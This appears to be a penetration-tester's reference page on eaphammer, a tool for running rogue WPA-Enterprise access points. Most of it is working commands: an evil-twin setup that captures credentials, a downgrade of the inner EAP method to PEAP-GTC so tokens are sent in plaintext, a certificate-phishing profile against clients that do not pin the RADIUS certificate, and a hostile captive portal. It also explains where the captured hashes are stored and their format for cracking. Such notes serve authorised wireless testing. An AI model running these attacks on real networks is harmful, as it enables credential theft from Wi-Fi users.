# eaphammer — the modern enterprise-evil-twin standard

**Verified against:** eaphammer 1.14 as of 2026-Q3

Gabriel Ryan's tool. Higher-level than hostapd-wpe: generates certs,
templates hostile portals, drives multiple attack profiles from a
single CLI invocation.

## The essential invocation

```
eaphammer --interface wlan0 \
          --essid "CorporateWiFi" \
          --creds \
          --auth wpa-eap
```

`--creds` turns on inner-EAP capture; `--auth wpa-eap` picks the
outer security mode.

## Inner-EAP downgrade

```
eaphammer --interface wlan0 --essid "CorpWiFi" \
          --creds --auth wpa-eap \
          --negotiate weakest
```

`weakest` tells the tool to accept whatever weaker inner method the
client offers — PEAP-GTC is the sweet spot because GTC sends the
token in plaintext under the tunnel.

## Cert-phishing profile

```
eaphammer --cert-wizard    # interactive; generates CA + server certs
eaphammer --interface wlan0 --essid "CorpWiFi" \
          --creds --auth wpa-eap \
          --cert /path/to/server.pem \
          --private-key /path/to/server.key
```

Against a client that does not pin the RADIUS cert, the fake cert is
accepted; the inner method proceeds; the credentials are captured.

## Hostile-portal profile

```
eaphammer --interface wlan0 --essid "GuestWiFi" \
          --hostile-portal \
          --captive-portal
```

Templates a captive portal HTML page — see `wifipumpkin3/` for the
adjacent template ecosystem eaphammer imports from.

## Output

Everything lands in `~/.eaphammer/loot/`:
- `hashcat.cred` — hashcat 5500 input for each captured MSCHAPv2
  (`user::domain::<NTResponse>:<ChallengeHash>` — 8-byte
  ChallengeHash pre-derived; see the callout in
  `enterprise/reference.md`).
- `john.cred` — the same in JtR format
- `raw/` — pcaps

## Cite

- s0lst1c3 eaphammer GitHub.
- attacks.json: `rogue-radius-eaphammer`,
  `eap-inner-downgrade-peap-mschapv2`,
  `eap-inner-downgrade-peap-gtc`,
  `cert-phish-eaphammer-weak-validation`.
